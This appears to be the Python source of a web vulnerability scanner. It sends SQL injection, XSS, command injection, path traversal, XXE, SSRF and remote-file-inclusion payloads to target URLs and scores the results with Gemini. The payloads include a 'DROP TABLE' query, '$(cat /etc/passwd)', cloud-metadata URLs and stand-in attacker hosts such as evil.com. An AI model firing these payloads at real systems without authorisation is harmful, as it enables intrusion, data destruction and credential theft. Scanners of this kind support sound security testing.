#!/usr/bin/env python3
"""
ML-Powered Vulnerability Detection Engine
Smart vulnerability detection using machine learning and AI assistance
"""

import asyncio
import aiohttp
import logging
import json
import re
import base64
import hashlib
import time
from datetime import datetime
import os
from .browser_runtime import get_launch_options, extend_args, detect_lan_ip
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass
from .ai_client import AIClient
from pathlib import Path

# Try to import Playwright for browser automation
try:
    from playwright.async_api import async_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False
    logging.warning("Playwright not available for browser verification")

logger = logging.getLogger("MLVulnEngine")

@dataclass
class MLVulnerabilityFinding:
    """ML-enhanced vulnerability finding"""
    url: str
    vuln_type: str
    severity: str
    confidence: float
    payload: str
    evidence: str
    discovered_at: datetime
    ml_score: float = 0.0
    ai_analysis: str = ""
    exploitation_complexity: str = ""
    business_impact: str = ""
    remediation_priority: int = 1

class MLVulnerabilityEngine:
    def __init__(self, asset_manager, config: Dict):
        self.asset_manager = asset_manager
        self.config = config
        # Allow environment override for Gemini key
        import os as _os
        self.gemini_key = (config.get('gemini_api_key') or _os.environ.get('GEMINI_API_KEY') or '').strip()
        
        # Initialize AI client for analysis
        ai_cfg = (config.get('ai_assistance') or {}) if isinstance(config, dict) else {}
        ai_enabled = bool(ai_cfg.get('enabled', True))
        if ai_enabled and self.gemini_key:
            try:
                self.ai_client = AIClient(config)
                logger.info("🤖 Pure Gemini AI Client initialized for vulnerability analysis")
                print("🤖 Pure Gemini AI Client initialized for vulnerability analysis")
            except Exception as e:
                self.ai_client = None
                logger.warning(f"⚠️ Failed to initialize AI client: {e}")
                print(f"⚠️ Failed to initialize AI client: {e}")
        else:
            self.ai_client = None
            if not ai_enabled:
                logger.info("🤖 AI assistance disabled by config — running without AI")
                print("🤖 AI assistance disabled by config — running without AI")
            else:
                logger.warning("⚠️ No Gemini API key provided — running without AI assistance")
                print("⚠️ No Gemini API key provided — running without AI assistance")
        
        # ML patterns for vulnerability detection
        self.vulnerability_patterns = {
            'sql_injection': {
                'patterns': [
                    r"SQL syntax.*error",
                    r"mysql_fetch_array\(\)",
                    r"mysql_num_rows\(\)",
                    r"You have an error in your SQL syntax",
                    r"Warning.*mysql.*",
                    r"ORA-\d{5}",
                    r"Microsoft.*ODBC.*SQL",
                    r"PostgreSQL.*ERROR",
                    r"valid MySQL result",
                    r"MySqlClient\.",
                    r"Unclosed quotation mark",
                    r"quoted string not properly terminated"
                ],
                'payloads': [
                    "1' OR '1'='1' #",
                    "1' OR 1=1 #",
                    "1' UNION SELECT null,user(),database() #",
                    "admin'--",
                    "1'; DROP TABLE users; --",
                    "1 OR 1=1 #",
                    "1 UNION SELECT null,user(),database() #",
                    "1' AND SLEEP(5) #"
                ]
            },
            'xss': {
                'patterns': [
                    # Only match our specific injected payloads, not legitimate HTML
                    r"<script[^>]*>alert\(['\"](XSS|test)['\"]?\)</script>",
                    r"<img[^>]*src\s*=\s*['\"]?x['\"]?[^>]*onerror\s*=\s*['\"]?alert\(",
                    r"<svg[^>]*onload\s*=\s*['\"]?alert\(",
                    r"javascript:alert\(['\"](XSS|test)['\"]?\)",
                    # Remove the generic on\w+\s*= pattern that causes false positives
                ],
                'payloads': [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "javascript:alert('XSS')",
                    "<svg onload=alert('XSS')>",
                    "'\"><script>alert('XSS')</script>",
                ]
            },
            'command_injection': {
                'patterns': [
                    r"uid=\d+\(.*\)",
                    r"root:.*:/bin/bash",
                    r"Directory of.*Volume",
                    r"sh: .*: command not found",
                    r"root:.*:0:0:",
                    r"/bin/.*: .*: not found",
                    r"FATAL.*ERROR.*password",
                    r"stderr: .*Permission denied",
                    r"bin/sh",
                    r"cmd.exe"
                ],
                'payloads': [
                    "; id",
                    "| whoami", 
                    "`pwd`",
                    "$(cat /etc/passwd)",
                    "&& echo vulnerable",
                    "; uname -a",
                    "| id"
                ]
            },
            'lfi': {
                'patterns': [
                    r"root:x:0:0:",
                    r"daemon:x:1:1:",
                    r"bin:x:2:2:",
                    r"\[boot loader\]",
                    r"Unable to open.*stream",
                    r"failed to open stream",
                    r"include_path",
                    r"No such file or directory",
                    r"Permission denied"
                ],
                'payloads': [
                    "../../../../etc/passwd",
                    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                    "/etc/passwd",
                    "file:///etc/passwd",
                    "....//....//....//etc/passwd",
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
                ]
            },
            'rfi': {
                'patterns': [
                    r"allow_url_include",
                    r"failed to open stream: HTTP request failed",
                    r"Warning.*include.*",
                    r"include_path.*failed"
                ],
                'payloads': [
                    "http://evil.com/shell.txt",
                    "https://pastebin.com/raw/evilcode",
                    "ftp://attacker.com/shell.php"
                ]
            },
            'csrf': {
                'patterns': [
                    r"CSRF.*token.*missing",
                    r"Invalid.*token",
                    r"Cross.*site.*request",
                    r"Token.*mismatch"
                ],
                'payloads': [
                    # CSRF testing requires form analysis, these are indicators
                    "csrf_test=1",
                    "token=invalid"
                ]
            },
            'open_redirect': {
                'patterns': [
                    r"Location:.*http",
                    r"window\.location",
                    r"document\.location",
                    r"header.*Location"
                ],
                'payloads': [
                    "http://evil.com",
                    "https://malicious.com",
                    "//evil.com",
                    "/\\evil.com",
                    "javascript:alert('redirect')"
                ]
            },
            'xxe': {
                'patterns': [
                    r"ENTITY.*SYSTEM",
                    r"<!DOCTYPE.*ENTITY",
                    r"root:x:0:0:",
                    r"file:///etc/passwd"
                ],
                'payloads': [
                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
                ]
            },
            'ssrf': {
                'patterns': [
                    r"169\.254\.169\.254",
                    r"metadata\.google\.internal",
                    r"Connection refused",
                    r"No route to host",
                    r"Connection timed out"
                ],
                'payloads': [
                    "http://169.254.169.254/latest/meta-data/",
                    "http://metadata.google.internal/computeMetadata/v1/",
                    "http://localhost:22",
                    "file:///etc/passwd"
                ]
            }
        }
        
        logger.info(f"🧠 ML Vulnerability Engine initialized with {len(self.vulnerability_patterns)} detection categories")

    async def analyze_vulnerabilities_with_ml(self, assets: List[Dict], session: aiohttp.ClientSession) -> List[MLVulnerabilityFinding]:
        """Analyze assets for vulnerabilities using ML-enhanced detection"""
        findings = []
        
        logger.info(f"🧠 ML VULN ANALYSIS: Starting intelligent vulnerability detection on {len(assets)} assets")
        
        for asset in assets:
            try:
                asset_findings = await self._analyze_single_asset_ml(asset, session)
                findings.extend(asset_findings)
            except Exception as e:
                logger.error(f"ML analysis failed for {asset.get('url', 'unknown')}: {e}")
        
        # Enhance findings with AI analysis if available
        if self.ai_client and findings:
            enhanced_findings = await self._enhance_findings_with_ai(findings)
            logger.info(f"🧠 ML Analysis Complete: {len(enhanced_findings)} vulnerabilities with ML intelligence")
            print(f"🧠 ML Analysis Complete: {len(enhanced_findings)} vulnerabilities with ML intelligence")
            return enhanced_findings
        
        return findings

    def quick_score_assets(self, assets: List[Dict]) -> Dict[str, float]:
        """Lightweight heuristic scoring to prioritize assets for testing.

        Uses URL patterns, query parameters, and tech hints; no network calls.
        """
        scores: Dict[str, float] = {}
        for a in assets:
            url = a.get('url','')
            tech = (a.get('tech_stack') or '').lower()
            s = 0.0
            u = url.lower()
            # Paths of interest
            for kw, w in [('admin',2.0),('login',1.0),('account',1.2),('dashboard',0.8),('api',1.5),('graphql',1.8),('soap',1.2),('upload',2.0),('file',1.5),('include',1.5),('redirect',1.2),('download',1.2),('export',1.0),('report',0.8),('search',1.0),('query',1.0),('id=',1.2),('page=',0.8),('action=',0.8)]:
                if kw in u:
                    s += w
            # Tech hints
            for tkw, w in [('php',1.2),('asp',1.0),('jsp',1.0),('python',0.8),('node',0.8),('wordpress',2.0),('drupal',1.5),('joomla',1.5),('magento',1.5),('mysql',1.0),('postgres',0.8)]:
                if tkw in tech:
                    s += w
            # Query-rich URLs
            if '?' in url:
                s += 0.8
            scores[url] = s
        return scores

    async def _analyze_single_asset_ml(self, asset: Dict, session: aiohttp.ClientSession) -> List[MLVulnerabilityFinding]:
        """ML-powered analysis of a single asset"""
        findings = []
        url = asset['url']
        tech_stack = asset.get('tech_stack', '')
        response_body = asset.get('response_body', '')
        
        logger.debug(f"🔬 ML analyzing: {url} (tech: {tech_stack})")
        
        # 1. Passive Analysis - Check response body for vulnerability indicators
        if response_body:
            passive_findings = await self._passive_vulnerability_detection(url, response_body, tech_stack)
            findings.extend(passive_findings)
        
        # 2. Active Testing - Smart payload selection based on tech stack
        active_findings = await self._active_vulnerability_testing(url, tech_stack, session)
        findings.extend(active_findings)
        
        # 3. ML Scoring - Calculate confidence scores
        for finding in findings:
            finding.ml_score = self._calculate_ml_confidence(finding, tech_stack)
        
        return findings

    async def _passive_vulnerability_detection(self, url: str, response_body: str, tech_stack: str) -> List[MLVulnerabilityFinding]:
        """Passive vulnerability detection from response analysis"""
        findings = []
        
        for vuln_type, config in self.vulnerability_patterns.items():
            for pattern in config['patterns']:
                if re.search(pattern, response_body, re.IGNORECASE):
                    confidence = self._calculate_pattern_confidence(pattern, response_body, tech_stack)
                    
                    if confidence > 0.3:  # Only report medium+ confidence findings
                        finding = MLVulnerabilityFinding(
                            url=url,
                            vuln_type=vuln_type,
                            severity=self._determine_severity(vuln_type, confidence),
                            confidence=confidence,
                            payload="passive_detection",
                            evidence=f"Pattern matched: {pattern}",
                            discovered_at=datetime.now(),
                            ml_score=confidence
                        )
                        findings.append(finding)
                        logger.info(f"🎯 ML PASSIVE DETECTION: {vuln_type} in {url} (confidence: {confidence:.2f})")
        
        return findings

    async def _active_vulnerability_testing(self, url: str, tech_stack: str, session: aiohttp.ClientSession) -> List[MLVulnerabilityFinding]:
        """Smart active testing based on tech stack"""
        findings = []
        
        # Select payloads based on technology stack
        target_vulns = self._select_target_vulnerabilities(tech_stack)
        
        for vuln_type in target_vulns:
            if vuln_type in self.vulnerability_patterns:
                config = self.vulnerability_patterns[vuln_type]
                
                # Test each payload
                for payload in config['payloads'][:2]:  # Limit to 2 payloads per type
                    try:
                        finding = await self._test_payload(url, vuln_type, payload, session)
                        if finding:
                            findings.append(finding)
                    except Exception as e:
                        logger.debug(f"Payload test failed for {url}: {e}")
        
        return findings

    def _select_target_vulnerabilities(self, tech_stack: str) -> List[str]:
        """Select vulnerability types to test based on technology stack - UNIVERSAL approach"""
        # Universal vulnerabilities to test on ALL targets
        universal_vulns = [
            'xss', 'sql_injection', 'command_injection', 'lfi', 'rfi', 
            'csrf', 'open_redirect', 'ssrf'
        ]
        
        tech_lower = tech_stack.lower()
        
        # Add specialized vulnerabilities based on detected technology
        if any(tech in tech_lower for tech in ['xml', 'soap', 'rest']):
            universal_vulns.append('xxe')
        
        if any(tech in tech_lower for tech in ['upload', 'file']):
            universal_vulns.append('file_upload')
        
        if any(tech in tech_lower for tech in ['api', 'json', 'graphql']):
            universal_vulns.append('injection')
        
        logger.debug(f"🎯 Universal vulnerability testing for any target: {universal_vulns}")
        return universal_vulns

    async def _test_payload(self, url: str, vuln_type: str, payload: str, session: aiohttp.ClientSession) -> Optional[MLVulnerabilityFinding]:
        """Test a specific payload against a URL"""
        try:
            # Create test URL with payload
            if '?' in url:
                test_url = f"{url}&test={payload}"
            else:
                test_url = f"{url}?test={payload}"
            
            async with session.get(test_url, timeout=10) as response:
                response_text = await response.text()
                
                # Special handling for XSS verification
                if vuln_type == 'xss':
                    return await self._verify_xss_payload(url, test_url, payload, response_text, session)
                
                # Check for vulnerability indicators
                config = self.vulnerability_patterns[vuln_type]
                for pattern in config['patterns']:
                    if re.search(pattern, response_text, re.IGNORECASE):
                        confidence = self._calculate_pattern_confidence(pattern, response_text, "")
                        
                        return MLVulnerabilityFinding(
                            url=url,
                            vuln_type=vuln_type,
                            severity=self._determine_severity(vuln_type, confidence),
                            confidence=confidence,
                            payload=payload,
                            evidence=f"Active test confirmed: {pattern}",
                            discovered_at=datetime.now(),
                            ml_score=confidence
                        )
        
        except Exception as e:
            logger.debug(f"Payload test error: {e}")
        
        return None
    
    async def _verify_xss_payload(self, original_url: str, test_url: str, payload: str, response_text: str, session: aiohttp.ClientSession) -> Optional[MLVulnerabilityFinding]:
        """Properly verify XSS payload execution"""
        
        # First, check if our exact payload appears in the response (reflected XSS)
        if payload not in response_text:
            logger.debug(f"XSS payload not reflected in response for {test_url}")
            return None
        
        print(f"🎯 XSS payload reflected in response, analyzing context...")
        logger.info(f"🎯 XSS payload reflected in response, analyzing context...")
        
        # Check if payload appears in executable context (not just as text)
        config = self.vulnerability_patterns['xss']
        for pattern in config['patterns']:
            if re.search(pattern, response_text, re.IGNORECASE):
                # Verify the payload is actually in an executable context
                if self._is_payload_executable(payload, response_text):
                    
                    # Try browser automation verification if available
                    browser_verified = False
                    browser_evidence = {}
                    if PLAYWRIGHT_AVAILABLE:
                        browser_verified, browser_evidence = await self._verify_xss_with_browser(test_url, payload)
                    
                    confidence = 0.9 if browser_verified else 0.7  # Higher confidence for browser verification
                    
                    # Build detailed evidence with browser automation results
                    evidence_parts = [f"XSS payload reflected in executable context: {payload}"]
                    
                    if browser_verified:
                        evidence_parts.append("✅ Browser execution confirmed:")
                        if browser_evidence.get('execution_time'):
                            evidence_parts.append(f"  - Alert triggered in {browser_evidence['execution_time']:.2f}s")
                        if browser_evidence.get('payload_in_source'):
                            evidence_parts.append(f"  - Payload in DOM:\n{browser_evidence['payload_in_source']}")
                        if browser_evidence.get('console_errors'):
                            evidence_parts.append(f"  - Console errors: {len(browser_evidence['console_errors'])}")
                    else:
                        evidence_parts.append("⚠️  Static analysis only - browser verification failed")
                        if browser_evidence.get('dom_contains_payload'):
                            evidence_parts.append("  - Payload found in DOM but no alert detected")
                        if browser_evidence.get('error'):
                            evidence_parts.append(f"  - Browser error: {browser_evidence['error']}")
                    
                    return MLVulnerabilityFinding(
                        url=original_url,
                        vuln_type='xss',
                        severity=self._determine_severity('xss', confidence),
                        confidence=confidence,
                        payload=payload,
                        evidence="\n".join(evidence_parts),
                        discovered_at=datetime.now(),
                        ml_score=confidence
                    )
        
        # If payload is reflected but not in executable context, it's likely a false positive
        logger.debug(f"XSS payload reflected but not in executable context for {test_url}")
        return None
    
    def _is_payload_executable(self, payload: str, response_text: str) -> bool:
        """Check if XSS payload is in an executable context"""
        
        # Look for the payload inside script tags, event handlers, etc.
        executable_contexts = [
            rf"<script[^>]*>.*?{re.escape(payload)}.*?</script>",
            rf"<[^>]*on\w+\s*=\s*['\"][^'\"]*{re.escape(payload)}[^'\"]*['\"]",
            rf"<[^>]*src\s*=\s*['\"]javascript:[^'\"]*{re.escape(payload)}",
            rf"<[^>]*href\s*=\s*['\"]javascript:[^'\"]*{re.escape(payload)}",
        ]
        
        for context_pattern in executable_contexts:
            if re.search(context_pattern, response_text, re.IGNORECASE | re.DOTALL):
                return True
        
        return False

    async def _verify_xss_with_browser(self, test_url: str, payload: str) -> tuple[bool, dict]:
        """Use browser automation to verify XSS payload actually executes"""
        evidence = {
            'dialog_detected': False,
            'console_errors': [],
            'dom_contains_payload': False,
            'payload_in_source': '',
            'execution_time': None
        }
        
        try:
            async with async_playwright() as playwright:
                opts = get_launch_options()
                headless = bool(opts['headless'])
                devtools = bool(opts['devtools'])
                rdp_port = opts['rdp_port']
                rdp_addr = opts['rdp_addr']

                launch_args = extend_args([], get_launch_options()['args'])

                browser = await playwright.chromium.launch(headless=headless, devtools=devtools, args=launch_args)
                context = await browser.new_context()
                page = await context.new_page()
                if rdp_port:
                    ip = detect_lan_ip()
                    logger.info(f"🔎 DevTools listening: http://{ip}:{rdp_port}  (chrome://inspect -> Add target)")
                
                # Capture console messages and (optionally) network
                console_messages = []
                _net = []
                from .browser_runtime import setup_observers as _setup
                _setup(page, console_messages, _net, structured=True)
                
                # Set up dialog handler to detect alerts
                dialog_detected = False
                start_time = time.time()
                
                async def handle_dialog(dialog):
                    nonlocal dialog_detected
                    dialog_detected = True
                    evidence['execution_time'] = time.time() - start_time
                    await dialog.accept()
                
                page.on("dialog", handle_dialog)
                
                # Navigate to the test URL with payload
                try:
                    await page.goto(test_url, timeout=15000)
                    await page.wait_for_timeout(2000)  # Wait for any delayed execution
                    
                    # Check if payload is in DOM
                    page_content = await page.content()
                    evidence['dom_contains_payload'] = payload in page_content
                    
                    # Extract relevant source containing payload
                    if evidence['dom_contains_payload']:
                        lines = page_content.split('\n')
                        for i, line in enumerate(lines):
                            if payload in line:
                                # Get context around the payload
                                start_idx = max(0, i-2)
                                end_idx = min(len(lines), i+3)
                                evidence['payload_in_source'] = '\n'.join(lines[start_idx:end_idx])
                                break
                    
                except Exception as e:
                    logger.debug(f"Browser navigation error for {test_url}: {e}")
                
                # Capture console errors
                evidence['console_errors'] = [msg for msg in console_messages if msg['type'] == 'error']
                evidence['dialog_detected'] = dialog_detected
                
                await browser.close()
                
                if dialog_detected:
                    logger.info(f"✅ XSS verified through browser automation: {test_url}")
                    return True, evidence
                else:
                    logger.debug(f"❌ XSS not verified in browser: {test_url}")
                    return False, evidence
                    
        except Exception as e:
            logger.debug(f"Browser verification failed: {e}")
            evidence['error'] = str(e)
            return False, evidence

    

    def _calculate_pattern_confidence(self, pattern: str, response_text: str, tech_stack: str) -> float:
        """Calculate confidence score for pattern match"""
        base_confidence = 0.5
        
        # Universal high-confidence vulnerability patterns
        high_confidence_patterns = [
            r"SQL syntax.*error",
            r"mysql_fetch_array\(\)",
            r"mysql_num_rows\(\)",
            r"You have an error in your SQL syntax",
            r"ORA-\d{5}",
            r"uid=\d+\(.*\)",
            r"root:.*:/bin/bash",
            r"root:x:0:0:",
            r"daemon:x:1:1:",
            r"Directory of.*Volume",
            r"<script[^>]*>.*?</script>",
            r"javascript:.*alert\(",
            r"onerror=.*alert\(",
            r"Unable to open.*stream",
            r"failed to open stream",
            r"include_path"
        ]
        
        for high_pattern in high_confidence_patterns:
            if re.search(high_pattern, pattern, re.IGNORECASE):
                base_confidence = 0.8
                break
        
        # Adjust based on tech stack relevance
        if tech_stack:
            if 'mysql' in pattern.lower() and 'mysql' in tech_stack.lower():
                base_confidence += 0.2
            elif 'php' in tech_stack.lower() and 'mysql' in pattern.lower():
                base_confidence += 0.1
        
        return min(base_confidence, 1.0)

    def _calculate_ml_confidence(self, finding: MLVulnerabilityFinding, tech_stack: str) -> float:
        """Calculate ML confidence score for a finding"""
        base_score = finding.confidence
        
        # Technology relevance boost
        tech_relevance = 0.0
        vuln_type = finding.vuln_type
        
        if vuln_type == 'sql_injection' and any(db in tech_stack.lower() for db in ['mysql', 'postgres', 'mssql', 'oracle']):
            tech_relevance = 0.2
        elif vuln_type == 'xss' and any(js in tech_stack.lower() for js in ['javascript', 'react', 'angular', 'vue']):
            tech_relevance = 0.2
        elif vuln_type == 'command_injection' and any(lang in tech_stack.lower() for lang in ['php', 'python', 'nodejs']):
            tech_relevance = 0.2
        
        return min(base_score + tech_relevance, 1.0)

    async def ai_validate_finding(self, finding: Dict) -> Optional[Dict]:
        """AI validation using Gemini Flash with per-type prompts to reduce false positives.

        Returns dict like { 'verdict': 'verified|reflected|benign', 'confidence': 0.0-1.0, 'reason': str }
        or None if AI is unavailable.
        """
        try:
            if not getattr(self, 'gemini_model', None):
                return None
            vt = (finding.get('vuln_type') or finding.get('type') or '').lower()
            url = finding.get('url', '')
            payload = finding.get('payload') or ''
            evidence = finding.get('evidence') or ''
            snippet = (evidence[:1000] if isinstance(evidence, str) else str(evidence)[:1000])
            def _build_prompt(vtype: str) -> str:
                header = (
                    "You are a senior application security engineer. Classify this finding with zero tolerance for false "
                    "positives. Use strict criteria for VERIFIED vs REFLECTED vs BENIGN. Provide reasons concisely.\n\n"
                    f"Type: {vtype}\nURL: {url}\nPayload: {payload}\nEvidence: {snippet}\n\n"
                )
                if 'xss' in vtype:
                    body = (
                        "- VERIFIED only if JavaScript executed in browser context (dialog event, sentinel variable).\n"
                        "- REFLECTED if payload appears without execution. BENIGN if likely false positive.\n"
                    )
                elif 'sql' in vtype:
                    body = (
                        "- VERIFIED if DB errors/leaks or proven UNION/boolean/time-based exploitation; REFLECTED if only echoed.\n"
                    )
                elif 'ssrf' in vtype:
                    body = (
                        "- VERIFIED if OOB callback observed or internal targets fetched; otherwise downrank.\n"
                    )
                elif 'inclusion' in vtype or 'lfi' in vtype:
                    body = (
                        "- VERIFIED if sensitive file signatures (/etc/passwd) or include errors confirm file handling.\n"
                    )
                elif 'command' in vtype and 'injection' in vtype:
                    body = (
                        "- VERIFIED if command output markers (uid=, whoami, echo markers) are present.\n"
                    )
                elif 'redirect' in vtype:
                    body = (
                        "- VERIFIED if 3xx Location header to attacker domain; REFLECTED if only link present.\n"
                    )
                else:
                    body = (
                        "- Only mark VERIFIED if exploit effect is demonstrated; otherwise REFLECTED or BENIGN.\n"
                    )
                tail = (
                    "\nOutput strict JSON: {\"verdict\": \"verified|reflected|benign\", \"confidence\": 0..1, \"reason\": \"...\"}."
                )
                return header + body + tail
            prompt = _build_prompt(vt)
            import asyncio as _asyncio
            try:
                raw = await self.ai_client.generate_text(prompt, temperature=0.1, max_tokens=2048)
            except Exception as e:
                raw = f"ERROR: {e}"
            try:
                import json as _json
                text = (raw or '').strip()
                start = text.find('{')
                end = text.rfind('}')
                if start != -1 and end != -1 and end > start:
                    obj = _json.loads(text[start:end+1])
                    verdict = str(obj.get('verdict', '')).lower()
                    conf = float(obj.get('confidence', 0.0))
                    reason = str(obj.get('reason', '')).strip()
                    if verdict in ('verified','reflected','benign'):
                        return {'verdict': verdict, 'confidence': max(0.0, min(1.0, conf)), 'reason': reason}
            except Exception:
                pass
            return None
        except Exception:
            return None

    def _determine_severity(self, vuln_type: str, confidence: float) -> str:
        """Determine severity based on vulnerability type and confidence"""
        severity_map = {
            'sql_injection': 'HIGH',
            'command_injection': 'CRITICAL',
            'xss': 'MEDIUM',
            'xxe': 'HIGH',
            'ssrf': 'HIGH'
        }
        
        base_severity = severity_map.get(vuln_type, 'MEDIUM')
        
        # Adjust based on confidence
        if confidence > 0.8:
            return base_severity
        elif confidence > 0.5:
            # Downgrade by one level for medium confidence
            if base_severity == 'CRITICAL':
                return 'HIGH'
            elif base_severity == 'HIGH':
                return 'MEDIUM'
            else:
                return 'LOW'
        else:
            return 'LOW'

    async def _enhance_findings_with_ai(self, findings: List[MLVulnerabilityFinding]) -> List[MLVulnerabilityFinding]:
        """Enhance findings with AI analysis using pure Gemini API"""
        if not self.ai_client:
            return findings
        
        logger.info(f"🤖 GEMINI ANALYSIS: Enhancing {len(findings)} findings with AI insights")
        print(f"🤖 GEMINI ANALYSIS: Enhancing {len(findings)} findings with AI insights")
        
        enhanced_findings = []
        
        # Process findings in batches to avoid rate limits
        batch_size = 5
        for i in range(0, len(findings), batch_size):
            batch = findings[i:i + batch_size]
            
            try:
                enhanced_batch = await self._analyze_findings_batch_with_ai(batch)
                enhanced_findings.extend(enhanced_batch)
                
                # Rate limiting
                await asyncio.sleep(1)
                
            except Exception as e:
                logger.error(f"AI enhancement failed for batch: {e}")
                enhanced_findings.extend(batch)  # Return original findings on error
        
        return enhanced_findings

    async def _analyze_findings_batch_with_ai(self, findings: List[MLVulnerabilityFinding]) -> List[MLVulnerabilityFinding]:
        """Analyze a batch of findings with AI"""
        # Prepare context for AI analysis
        context = {
            "findings": [],
            "analysis_request": "Analyze these vulnerability findings and provide exploitation complexity, business impact assessment, and remediation priority (1-5 scale)"
        }
        
        for finding in findings:
            context["findings"].append({
                "url": finding.url,
                "vuln_type": finding.vuln_type,
                "severity": finding.severity,
                "confidence": finding.confidence,
                "payload": finding.payload,
                "evidence": finding.evidence
            })
        
        prompt = f"""
        You are a cybersecurity expert analyzing vulnerability findings. For each finding, provide:
        1. Exploitation complexity (LOW/MEDIUM/HIGH)
        2. Business impact assessment (brief description)
        3. Remediation priority (1=Critical, 5=Low)
        
        Context: {json.dumps(context, indent=2)}
        
        Respond in JSON format with an array of objects containing: exploitation_complexity, business_impact, remediation_priority, ai_analysis
        """
        
        try:
            logger.info("🤖 Sending findings to AI for analysis...")
            print("🤖 Sending findings to AI for analysis...")
            response = await self.ai_client.generate_text(prompt, temperature=0.2, max_tokens=2048)
            
            print(f"🤖 AI Response received: {response[:200]}...")
            logger.info(f"🤖 AI Response received: {response[:200]}...")
            
            # Clean up AI response - remove markdown code blocks if present
            response_clean = response.strip()
            if response_clean.startswith('```json'):
                response_clean = response_clean[7:]  # Remove ```json
            if response_clean.startswith('```'):
                response_clean = response_clean[3:]   # Remove ```
            if response_clean.endswith('```'):
                response_clean = response_clean[:-3]  # Remove trailing ```
            response_clean = response_clean.strip()
            
            ai_analysis = json.loads(response_clean)
            
            # Enhance findings with AI insights
            for i, finding in enumerate(findings):
                if i < len(ai_analysis):
                    analysis = ai_analysis[i]
                    finding.exploitation_complexity = analysis.get('exploitation_complexity', 'MEDIUM')
                    finding.business_impact = analysis.get('business_impact', 'Assessment pending')
                    finding.remediation_priority = analysis.get('remediation_priority', 3)
                    finding.ai_analysis = analysis.get('ai_analysis', 'AI analysis completed')
                    print(f"🤖 Enhanced finding {i+1}: {finding.vuln_type} - {analysis.get('ai_analysis', 'No analysis')}")
                    logger.info(f"🤖 Enhanced finding {i+1}: {finding.vuln_type} - {analysis.get('ai_analysis', 'No analysis')}")
        
        except Exception as e:
            logger.error(f"🚨 AI analysis failed: {e}")
            print(f"🚨 AI analysis failed: {e}")
            # Set default values on error
            for finding in findings:
                finding.exploitation_complexity = 'MEDIUM'
                finding.business_impact = 'Requires manual assessment'
                finding.remediation_priority = 3
                finding.ai_analysis = 'AI analysis unavailable'
        
        return findings

    def store_ml_finding(self, finding: MLVulnerabilityFinding):
        """Store ML finding in database"""
        try:
            # Get asset ID from URL
            asset = self.asset_manager.get_asset_by_url(finding.url)
            if not asset:
                logger.warning(f"Asset not found for URL: {finding.url}")
                return
            
            # Store vulnerability
            vuln_data = {
                'asset_id': asset['id'],
                'type': finding.vuln_type,
                'description': f"{finding.evidence} | ML Score: {finding.ml_score:.2f} | {finding.ai_analysis}",
                'severity': finding.severity,
                'evidence': finding.evidence,
                'payload': finding.payload,
                'detected_at': finding.discovered_at.isoformat(),
                'confidence': finding.confidence
            }
            
            self.asset_manager.add_vulnerability(vuln_data)
            logger.info(f"✅ ML finding stored: {finding.vuln_type} in {finding.url}")
            
        except Exception as e:
            logger.error(f"Failed to store ML finding: {e}")
